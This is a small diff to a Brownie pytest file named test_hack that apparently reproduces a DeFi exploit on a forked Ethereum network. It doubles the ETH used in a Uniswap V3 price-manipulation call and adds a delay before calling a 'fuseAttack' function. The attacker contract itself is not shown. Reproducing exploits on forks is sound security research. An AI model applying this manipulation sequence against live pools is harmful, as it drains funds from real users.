@@ -1,3 +1,5 @@
+import time
+
 import pytest
 from brownie import accounts
 
@@ -18,7 +20,9 @@ def test_hack(eth_fork_network, brownie_project):
     # print(pool.slot0())
     # print(attacker_contract.getSqrtPriceLimit())
 
-    attacker_contract.manipulateUniswapV3({'from': attacker_eoa, 'value': eth_fork_network.web3.toWei(500, 'ether')})
+    attacker_contract.manipulateUniswapV3({'from': attacker_eoa, 'value': eth_fork_network.web3.toWei(1000, 'ether')})
+
+    time.sleep(30)
 
     attacker_contract.fuseAttack({'from': attacker_eoa})
 
